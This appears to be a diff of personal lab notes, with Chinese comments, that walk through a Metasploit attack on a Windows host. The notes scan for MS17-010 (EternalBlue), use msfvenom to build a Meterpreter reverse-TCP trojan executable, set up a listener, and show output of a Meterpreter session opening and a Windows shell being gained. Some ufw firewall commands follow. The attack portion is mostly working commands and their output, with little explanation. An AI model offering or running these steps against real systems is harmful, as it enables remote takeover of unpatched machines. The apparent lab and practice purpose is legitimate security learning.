@@ -2,13 +2,9 @@
 
 - msfconsole 
 
- 
-
 - search ms17_010 
 
 \#永恒之蓝漏洞模板 
-
- 
 
 - use auxiliary/scanner/smb/smb_ms17_010 
 
@@ -18,13 +14,9 @@ show options
 
 \#扫描目标IP是否存在此漏洞 
 
- 
-
 - msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.26.197.13 LPORT=12345 -f exe > win2012.exe 
 
 \#生成一个win2012.exe的木马文件，反向连接到kali主机 
-
- 
 
 - use exploit/multi/handler 
 
@@ -32,19 +24,13 @@ show options
 
 \#开启端口监听 
 
- 
-
 - set payload windows/meterpreter_reverse_tcp 
 
 \#设置payload反弹 
 
- 
-
 show options 
 
 \#设置参数 
-
- 
 
 - set LHOST 172.26.197.13 
 
@@ -56,8 +42,6 @@ LPORT => 12345
 
 \#设置反向连接IP（kali）和端口 
 
- 
-
 - run 
 
 [*] Started reverse TCP handler on 172.26.197.13:12345 
@@ -65,8 +49,6 @@ LPORT => 12345
 [*] Meterpreter session 1 opened (172.26.197.13:12345 -> 172.26.192.1:2177) at 2023-12-11 23:23:41 +0800 
 
 \#开始监听 
-
- 
 
 - shell 
 
@@ -80,8 +62,6 @@ Microsoft Windows [�汾 6.1.7601]
 
 \#获取权限 
 
- 
-
 - use exploit/windows/smb/ms17_010_eternalblue 
 
 show options 
@@ -93,19 +73,13 @@ show options
 
 \#install ufw 
 
- 
-
 - ufw enable 
 
 \#turn on ufw 
 
- 
-
 - ufw allow 80 
 
 \#open port 80 
-
- 
 
 - ufw status 
 
